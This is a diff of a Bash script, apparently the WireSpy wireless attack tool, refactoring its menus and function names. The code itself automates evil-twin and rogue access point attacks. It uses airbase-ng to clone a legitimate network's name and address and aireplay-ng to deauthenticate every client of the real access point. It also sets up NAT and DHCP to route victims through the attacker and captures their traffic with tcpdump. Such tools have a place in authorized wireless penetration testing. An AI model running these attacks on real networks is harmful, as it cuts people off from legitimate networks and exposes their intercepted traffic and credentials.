@@ -17,6 +17,7 @@
 # TODO:
 # * Implement nice coloring
 # * Fix channel restrictions (WCHAN)
+# * make the quit clearer by changing some of them with back or menu
 
 # enable stricter programming rules (turns some bugs into errors)
 # set -Eeuo pipefail
@@ -25,7 +26,7 @@ declare -gr  PROGNAME=$(basename $0)
 declare -gr  PROGBASENAME=${PROGNAME%%.*}
 declare -gr  PROGDIR=$(dirname ${BASH_SOURCE[0]})
 declare -gr  PROGVERSION=0.6dev
-declare -gr  BRANCH='master'
+declare -gr  BRANCH='dev'
 declare -gar REQUIRED_PACKAGES=( # comment this variable out if experiencing any issue with the dependencies checks
     'aircrack-ng'
     'coreutils'
@@ -53,10 +54,11 @@ The final step is to deauthenticate all the clients from the target access point
 to the evil twin.
 """
 
-declare -gi isHoneypot=0
-declare -gi isEviltwin=0
+declare -g isHoneypot=false
+declare -g isEviltwin=false
 
-declare -gr REGEX_TINTF='at[[:digit:]]+' # according to airbase-ng documentation the tap interface is always like atX
+declare -gr REGEX_MAC_ADDRESS='^([a-fA-F0-9]{2}:){5}[a-fA-F0-9]{2}$'
+declare -gr REGEX_TINTF='^at[[:digit:]]+$' # according to airbase-ng documentation the tap interface is always like atX
 declare -g  INTF=''
 declare -g  MINTF=''
 declare -g  TINTF=''
@@ -69,7 +71,7 @@ declare -gi PID_TCPDUMP=0
 declare -gr PROMPT=$(printf "%s »" "$PROGBASENAME")
 declare -gr PROMPT_ET=$(printf "%s > %-8.8s »" "$PROGBASENAME" "eviltwin")
 declare -gr PROMPT_HP=$(printf "%s > %-8.8s »" "$PROGBASENAME" "honeypot")
-declare -gr PROMPT_PU=$(printf "%s > %-8.8s »" "$PROGBASENAME" "powerup")
+declare -gr PROMPT_PU=$(printf "%s > %-8.8s »" "$PROGBASENAME" "powerUp")
 declare -g  PS3="$(echo -e $PROMPT) "
 
 print()         { printf "%s » %s\n" "$PROGBASENAME" "$1"; }
@@ -80,12 +82,12 @@ print_status()  { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "status" "$1"; }
 print_warning() { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "warning" "$1"; }
 print_hp()      { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "honeypot" "$1"; }
 print_et()      { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "eviltwin" "$1"; }
-print_pu()      { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "powerup" "$1"; }
+print_pu()      { printf "%s > %-8.8s » %s\n" "$PROGBASENAME" "powerUp" "$1"; }
 
 trap quit INT
 
 function quit() {
-    clean_up
+    cleanUp
     exit 130
 }
 
@@ -97,7 +99,7 @@ Author: Alexandre Teyar | LinkedIn: linkedin.com/in/alexandre-teyar | GitHub: gi
 BANNER
 }
 
-function check_update() {
+function checkUpdate() {
     print 'Checking for an update...'
 
     if [[ $(git rev-parse --is-inside-work-tree 2> /dev/null) ]]
@@ -113,7 +115,7 @@ function check_update() {
     fi
 }
 
-function check_compatibility() {
+function checkCompatibility() {
     local -i var=0
     
     print 'Bash version check...'
@@ -147,18 +149,17 @@ function check_compatibility() {
 }
 
 function usage {
-
 cat <<- USAGE
 
 Attacks:
-    eviltwin      > launch an evil-twin attack
+    eviltwin      > launch an eviltwin attack
     honeypot      > launch a rogue access point attack
 
 Commands:
     clear         > clear the terminal
     help          > list available commands
-    iw_scan       > show all wireless access points nearby
     quit|exit     > exit the program
+    apscan        > show all wireless access points nearby
     leases        > display DHCP leases
     powerup       > power wireless interface up (may cause issues)
     start capture > start packet capture (tcpdump)
@@ -169,39 +170,12 @@ USAGE
 }
 
 function menu() {
-    clean_up &> /dev/null
+    cleanUp &> /dev/null
 
     while :
     do
         read -p  "$(echo -e $PROMPT) "
-
         case $REPLY in
-            'status')
-                local honeypot_status='not running'
-                local eviltwin_status='not running'
-                local tcpdump_status='not running'
-
-                if [[ $isEviltwin = 1 ]]
-                then
-                    eviltwin_status='running...'
-                fi
-                if [[ $isHoneypot = 1 ]]
-                then
-                    honeypot_status='running...'
-                fi
-                if (( $PID_TCPDUMP > 0 ))
-                then
-                    tcpdump_status='running...'
-                fi
-
-cat <<- STATUS
-
-    eviltwin       > $eviltwin_status
-    honeypot       > $honeypot_status
-    packet capture > $tcpdump_status
-
-STATUS
-                ;;
             'clear')
                 clear
                 ;;
@@ -213,63 +187,32 @@ STATUS
                 ;;
             'eviltwin')
                 PS3="$(echo -e $PROMPT_ET) "
-                isAttackRunning 'eviltwin'
-                isEviltwin=1
+                checkRunningAttack 'eviltwin'
+                isEviltwin=true
                 ;;
             'honeypot')
                 PS3="$(echo -e $PROMPT_HP) "
-                isAttackRunning 'honeypot'
-                isHoneypot=1
+                checkRunningAttack 'honeypot'
+                isHoneypot=true
+                ;;
+            'apscan')
+                checkRunningAttack 'APScan'
+                ;;
+            'lease'|'leases')
+                checkAPRequirements 'displayDHCPleases'
                 ;;
             'powerup')
                 PS3="$(echo -e $PROMPT_PU) "
-                isAttackRunning 'powerup'
-                ;;
-            'iw_scan')
-                isAttackRunning 'iw_scan'
-                ;;
-            'lease'|'leases')
-                if [[ $isHoneypot = 0 && $isEviltwin = 0 ]]
-                then
-                    print_warning "$AP_PREREQUISITE"
-                else
-                    if [[ $(cat /var/run/dhcpd.pid) ]]
-                    then
-                        cat /var/lib/dhcp/dhcpd.leases
-                    else
-                        print_warning 'The DHCP server has not been started'
-                    fi
-                fi
+                checkRunningAttack 'powerUp'
                 ;;
             'start capture')
-                if [[ $isHoneypot = 0 && $isEviltwin = 0 ]]
-                then
-                    print_warning "$AP_PREREQUISITE"
-                else
-                    if (( $PID_TCPDUMP == 0 ))
-                    then
-                        print_info "Packet capture started, the resulting file will be ${PROGDIR}/logs/capture_$(/bin/date +"%Y%m%d-%H%M%S").pcap"
-                        # we want to keep the stderr in case of problem
-                        PID_TCPDUMP=$(tcpdump -i $TINTF -w ${PROGDIR}/logs/capture_$(/bin/date +"%Y%m%d-%H%M%S").pcap &> /dev/null & echo $!)
-                    else
-                        print_warning 'The traffic is already being captured'
-                    fi
-                fi
+                checkAPRequirements 'startCapture'
                 ;;
             'stop capture')
-                if [[ $isHoneypot = 0 && $isEviltwin = 0 ]]
-                then
-                    print_warning "$AP_PREREQUISITE"
-                else
-                    if (( $PID_TCPDUMP > 0 ))
-                    then
-                        print_info "Packet capture stopped"
-                        kill -SIGTERM "$PID_TCPDUMP"
-                        PID_TCPDUMP=0
-                    else
-                        print_warning 'No packet capture has been launched'
-                    fi
-                fi
+                checkAPRequirements 'stopCapture'
+                ;;
+            'status')
+                showStatus
                 ;;
             *)
                 print_warning "Invalid command: ${REPLY}. Type help for the list of available commands"
@@ -278,25 +221,64 @@ STATUS
     done
 }
 
-function eviltwin() {
-    configure_intfs
+function checkRunningAttack() {
+    local -r delegated_function=$1
 
-    setManagedMode $MINTF 1> /dev/null && iw_scan $MINTF && setMonitorMode $MINTF 1> /dev/null
+    if [[ $isHoneypot = true || $isEviltwin = true ]]
+    then
+        print_warning "An attack (honeypot|eviltwin) is currently taking place. Do you wish to stop to start ${delegated_function}?"
+        select option in 'yes' 'no'
+        do
+            case $option in
+                'yes') 
+                    print_info "Stopping the running attack..."
+                    cleanUp &> /dev/null
+                    isHoneypot=false
+                    isEviltwin=false
+                    $delegated_function
+                    break
+                    ;;
+                'no')
+                    break
+                    ;;
+            esac
+        done
+    else
+        $delegated_function
+    fi
+}
+
+function eviltwin() {
+    attackPrerequisites
+
+    setManagedMode $MINTF 1> /dev/null && APScan $MINTF && setMonitorMode $MINTF 1> /dev/null
     
     echo "$EVILTWIN_INFO"
 
-    print_et 'Enter the evil-twin ESSID (the value must be identical to the legitimate access-point to spoof):'
+    print_et 'Enter the eviltwin ESSID (the value must be identical to the legitimate access-point to spoof):'
     read -p "$(echo -e $PROMPT) " eviltwin_ESSID
 
-    print_et 'Enter the evil-twin BSSID (the value must be identical to the legitimate access-point to spoof):'
-    read -p "$(echo -e $PROMPT) " eviltwin_BSSID
+    print_et 'Enter the eviltwin BSSID (the value must be identical to the legitimate access-point to spoof):'
+    while :
+    do
+        read -p "$(echo -e $PROMPT) "
+        if [[ $REPLY =~ $REGEX_MAC_ADDRESS ]]
+        then
+            local -r eviltwin_BSSID=$REPLY
+            break
+        else
+            print_warning "Invalid MAC address: $REPLY. The correct format should be XX:XX:XX:XX:XX:XX"
+        fi
+    done
 
     print_et 'Enter the wireless channel to use (the value must be identical to the legitimate access-point to spoof):'
     while :
     do
-        read -p  "$(echo -e $PROMPT) "
-        
+        read -p "$(echo -e $PROMPT) "
         case $REPLY in 
+            'quit')
+                menu
+                ;;
             [1-9]|1[0-2])
                 local -i WCHAN=$REPLY
                 break
@@ -309,13 +291,13 @@ function eviltwin() {
 
     local -r TEMP_FILE=$(mktemp "${PROGDIR}/temp/XXXXXXXXXXXXXXXX")
 
-    xterm -fg green -title "Evil-twin - $eviltwin_ESSID" -e "airbase-ng -c $WCHAN -e $eviltwin_ESSID -P $MINTF -v | tee $TEMP_FILE 2> /dev/null" &
+    xterm -fg green -title "Eviltwin - $eviltwin_ESSID" -e "airbase-ng -c $WCHAN -e $eviltwin_ESSID -P $MINTF -v | tee $TEMP_FILE 2> /dev/null" &
     PID_AIRBASE=$!
     sleep 4 # necessary to let TINTF come up before setting it up
 
     # extracting the tap interface
     TINTF=$(grep 'Created tap interface' "$TEMP_FILE" | awk '{print $5}')
-    
+
     if ! [[ $TINTF =~ $REGEX_TINTF ]]
     then
         print_error "$AIRBASE_ERROR"
@@ -323,18 +305,18 @@ function eviltwin() {
     fi
 
     # de-auth the legit connected users
-    xterm -fg green -title "aireplay-ng - $eviltwin_ESSID" -e "aireplay-ng --ignore-negative-one --deauth 0 -a $eviltwin_BSSID -e eviltwin_ESSID $MINTF" &
+    xterm -fg green -title "aireplay-ng - $eviltwin_ESSID" -e "aireplay-ng --ignore-negative-one --deauth 0 -a $eviltwin_BSSID -e $eviltwin_ESSID $MINTF" &
     PID_AIREPLAY=$!
     sleep 4
 
-    enable_internet
+    enableInternetAccess
     
     print_info "The eviltwin $eviltwin_ESSID is now running..."
     sleep 4
 }
 
 function honeypot() {
-    configure_intfs
+    attackPrerequisites
 
     echo ''
 
@@ -368,8 +350,7 @@ of requests in areas with high levels of WiFi activity such as crowded public pl
     print_hp 'Enter the honeypot wireless channel (value must be between 1 and 12):'
     while :
     do
-        read -p  "$(echo -e $PROMPT) "
-        
+        read -p "$(echo -e $PROMPT) "
         case $REPLY in 
             [1-9]|1[0-2])
                 local -ir WCHAN=$REPLY
@@ -428,24 +409,24 @@ of requests in areas with high levels of WiFi activity such as crowded public pl
 
     # extracting the tap interface
     TINTF=$(grep 'Created tap interface' "$TEMP_FILE" | awk '{print $5}')
-    
+
     if ! [[ $TINTF =~ $REGEX_TINTF ]]
     then
         print_error "$AIRBASE_ERROR"
         menu
     fi
 
-    enable_internet
+    enableInternetAccess
     
     print_info "The honeypot $ESSID is now running..."
     sleep 4
 }
 
-function configure_intfs() {
+function attackPrerequisites() {
     local -a INTERFACES
 
     print 'Select the Internet-facing interface:'
-    get_intfs INTERFACES
+    getIntfs INTERFACES
     select option in "${INTERFACES[@]}" 'quit'
     do
         case $option in
@@ -484,7 +465,7 @@ function configure_intfs() {
     local -a WINTERFACES
 
     print 'Select the wireless interface to use:'
-    get_wintfs WINTERFACES
+    getWIntfs WINTERFACES
     select option in "${WINTERFACES[@]}" 'quit'
     do
         case $option in
@@ -531,20 +512,58 @@ function configure_intfs() {
         esac
     done
 
-    print_info "Killing processes that may interfere with the honeypot|evil-twin..."
+    print_info "Killing processes that may interfere with the honeypot|eviltwin..."
     airmon-ng check kill | sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/ /g' # remove newlines
 
     sleep 4
 }
 
-function powerup() {
+function enableInternetAccess() {
+    # configuring the newly created tap intrface
+    ip addr flush dev $TINTF
+    ip link set $TINTF down && ip addr add 10.0.0.254/24 dev $TINTF && ip link set $TINTF up
+    ip route flush dev $TINTF
+    ip route add 10.0.0.0/24 via 10.0.0.254 dev $TINTF
+
+    print_info 'Enabling IP forwarding...'
+    echo 1 > /proc/sys/net/ipv4/ip_forward
+    # setting up ip address and route
+
+    print_info 'Configuring NAT iptables...'
+    # cleaning the mess
+    iptables --flush
+    iptables --table nat --flush
+    iptables --delete-chain
+    iptables --table nat --delete-chain
+    # iptables rules
+    iptables -P FORWARD ACCEPT
+    # forward the traffic via the internet facing interface
+    iptables -t nat -A POSTROUTING -o $INTF -j MASQUERADE
+
+    # reset any pre-existing dhcp leases
+    print_info 'Resetting pre-existing DHCP leases...'
+    cat /dev/null > '/var/lib/dhcp/dhcpd.leases'
+    cat /dev/null > '/tmp/dhcpd.conf'
+
+    # copy the conf file for the DHCP serv and change the isc-dhcp-server settings
+    print_info 'Backing up /etc/dhcp/dhcpd.conf, /etc/default/isc-dhcp-server and importing the new configurations...'
+    cp --backup "${PROGDIR}/config/dhcpd.conf" '/etc/dhcp/dhcpd.conf'
+    sed -i.bak -e "s/INTERFACESv4=.*/INTERFACESv4=\"${TINTF}\"/" '/etc/default/isc-dhcp-server'
+
+    # starting the DHCP service
+    print_info 'Starting DHCP server to provide the victims with internet access...'
+    /etc/init.d/isc-dhcp-server start 
+    sleep 4
+}
+
+function powerUp() {
     local -a WINTERFACES
     local    WINTF=$1
 
     if ! [[ $WINTF ]]
     then
         print 'Select the wireless interface to boost-up:'
-        get_wintfs WINTERFACES
+        getWIntfs WINTERFACES
         select option in "${WINTERFACES[@]}" 'quit'
         do
             case $option in
@@ -566,7 +585,6 @@ function powerup() {
     while :
     do
         read -p  "$(echo -e $PROMPT) "
-        
         if [[ $REPLY -ge 0 ]] && [[ $REPLY -le 4000 ]]
         then
             local -ir BOOST=$REPLY
@@ -586,14 +604,14 @@ function powerup() {
     echo ''
 }
 
-function iw_scan() {
+function APScan() {
     local -a WINTERFACES
     local    WINTF=$1
 
     if ! [[ $WINTF ]]
     then
         print 'Select the wireless interface to use:'
-        get_wintfs WINTERFACES
+        getWIntfs WINTERFACES
         select option in "${WINTERFACES[@]}" 'quit'
         do
             case $option in
@@ -640,7 +658,7 @@ function iw_scan() {
     fi
 }
 
-function get_intfs() {
+function getIntfs() {
     local -r INTFS=$(ip -o link show | awk -F': ' '!/lo/{print $2}')
     local -n _INTERFACES=$1 # referenced copy of the array passed to the function
 
@@ -660,7 +678,7 @@ function get_intfs() {
     fi
 }
 
-function get_wintfs() {
+function getWIntfs() {
     local -r WINTFS=$(ip -o link show | awk -F': ' '{print $2}' | egrep 'wlan[[:digit:]]+')
     local -n _WINTERFACES=$1 # referenced copy of the array passed to the function
 
@@ -680,68 +698,72 @@ function get_wintfs() {
     fi
 }
 
-function enable_internet() {
-    # configuring the newly created tap intrface
-    ip addr flush dev $TINTF
-    ip link set $TINTF down && ip addr add 10.0.0.254/24 dev $TINTF && ip link set $TINTF up
-    ip route flush dev $TINTF
-    ip route add 10.0.0.0/24 via 10.0.0.254 dev $TINTF
+function showStatus() {
+    local honeypot_status='not running'
+    local eviltwin_status='not running'
+    local tcpdump_status='not running'
 
-    print_info 'Enabling IP forwarding...'
-    echo 1 > /proc/sys/net/ipv4/ip_forward
-    # setting up ip address and route
+    if [[ $isEviltwin = true ]]
+    then
+        eviltwin_status='running...'
+    fi
+    if [[ $isHoneypot = true ]]
+    then
+        honeypot_status='running...'
+    fi
+    if (( $PID_TCPDUMP > 0 ))
+    then
+        tcpdump_status='running...'
+    fi
 
-    print_info 'Configuring NAT iptables...'
-    # cleaning the mess
-    iptables --flush
-    iptables --table nat --flush
-    iptables --delete-chain
-    iptables --table nat --delete-chain
-    # iptables rules
-    iptables -P FORWARD ACCEPT
-    # forward the traffic via the internet facing interface
-    iptables -t nat -A POSTROUTING -o $INTF -j MASQUERADE
+cat <<- STATUS
 
-    # reset any pre-existing dhcp leases
-    print_info 'Resetting pre-existing DHCP leases...'
-    cat /dev/null > '/var/lib/dhcp/dhcpd.leases'
-    cat /dev/null > '/tmp/dhcpd.conf'
+    eviltwin       > $eviltwin_status
+    honeypot       > $honeypot_status
+    packet capture > $tcpdump_status
 
-    # copy the conf file for the DHCP serv and change the isc-dhcp-server settings
-    print_info 'Backing up /etc/dhcp/dhcpd.conf, /etc/default/isc-dhcp-server and importing the new configurations...'
-    cp --backup "${PROGDIR}/config/dhcpd.conf" '/etc/dhcp/dhcpd.conf'
-    sed -i.bak -e "s/INTERFACESv4=.*/INTERFACESv4=\"${TINTF}\"/" '/etc/default/isc-dhcp-server'
-
-    # starting the DHCP service
-    print_info 'Starting DHCP server to provide the victims with internet access...'
-    /etc/init.d/isc-dhcp-server start 
-    sleep 4
+STATUS
 }
 
-function isAttackRunning() {
-    delegate_function=$1
+function checkAPRequirements() {
+    local -r delegated_function=$1
 
-    if [[ $isHoneypot = 1 || $isEviltwin = 1 ]]
+    if [[ $isHoneypot = false && $isEviltwin = false ]]
     then
-        print_warning "An attack (honeypot|evil-twin) is currently taking place. Do you wish to stop to start ${delegate_function}?"
-        select option in 'yes' 'no'
-        do
-            case $option in
-                'yes') 
-                    print_info "Stopping the running attack..."
-                    clean_up &> /dev/null
-                    isHoneypot=0
-                    isEviltwin=0
-                    $delegate_function
-                    break
-                    ;;
-                'no')
-                    break
-                    ;;
-            esac
-        done
+        print_warning "$AP_PREREQUISITE"
     else
-        $delegate_function
+        $delegated_function
+    fi
+}
+
+function displayDHCPleases() {
+    if [[ $(cat /var/run/dhcpd.pid) ]]
+    then
+        cat /var/lib/dhcp/dhcpd.leases
+    else
+        print_warning 'The DHCP server has not been started'
+    fi
+}
+
+function startCapture() {
+    if (( $PID_TCPDUMP == 0 ))
+    then
+        print_info "Packet capture started, the resulting file will be ${PROGDIR}/logs/capture_$(/bin/date +"%Y%m%d-%H%M%S").pcap"
+        # we want to keep the stderr in case of problem
+        PID_TCPDUMP=$(tcpdump -i $TINTF -w ${PROGDIR}/logs/capture_$(/bin/date +"%Y%m%d-%H%M%S").pcap &> /dev/null & echo $!)
+    else
+        print_warning 'The traffic is already being captured'
+    fi
+}
+
+function stopCapture() {
+    if (( $PID_TCPDUMP > 0 ))
+    then
+        print_info "Packet capture stopped"
+        kill -SIGTERM "$PID_TCPDUMP"
+        PID_TCPDUMP=0
+    else
+        print_warning 'No packet capture has been launched'
     fi
 }
 
@@ -803,8 +825,8 @@ function setMonitorMode() {
     fi
 }
 
-function clean_up() {
-    if [[ $isHoneypot = 1 || $isEviltwin = 1 ]]
+function cleanUp() {
+    if [[ $isHoneypot = true || $isEviltwin = true ]]
     then
         print_info 'Terminating active processes...'
         if (( $PID_AIRBASE > 0 ))
@@ -856,11 +878,11 @@ function clean_up() {
 # this step is necessary since WireSpy needs to be perform network changes
 if [[ $EUID -ne 0 ]]
 then
-    print_error "You must run this script as as root using the command: sudo bash $PROGNAME"
+    print_error "You must run this script as as root using the command: sudo bash ${BASH_SOURCE[0]}"
     exit 1
 fi
 
 banner
-check_update
-check_compatibility
+checkUpdate
+checkCompatibility
 menu
